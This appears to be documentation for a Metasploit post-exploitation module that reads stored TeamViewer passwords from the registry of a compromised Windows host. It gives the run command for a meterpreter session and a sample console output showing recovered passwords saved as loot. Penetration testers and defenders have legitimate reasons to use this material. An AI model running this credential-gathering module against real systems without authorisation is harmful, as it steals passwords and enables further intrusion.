## Vulnerable Application

  Any Windows host with a `meterpreter` session.

## Verification Steps

  1. Get a `meterpreter` session on a Windows host.
  2. Do: ```run post/windows/gather/credentials/teamviewer_passwords```
  3. If the system has registry keys for TeamViewer passwords they will be printed out.

## Options

  None.

## Scenarios

```
meterpreter > run post/windows/gather/credentials/teamviewer_passwords 

[*] Finding TeamViewer Passwords on WEQSQUGO-2156
[+] Found Exported Unattended Password: P@$$w0rd
[+] Found Options Password: op*****5
[+] Passwords stored in: /home/blurbdust/.msf4/loot/20200207052401_default_***.***.***.***_host.teamviewer__588749.txt
meterpreter > 
```
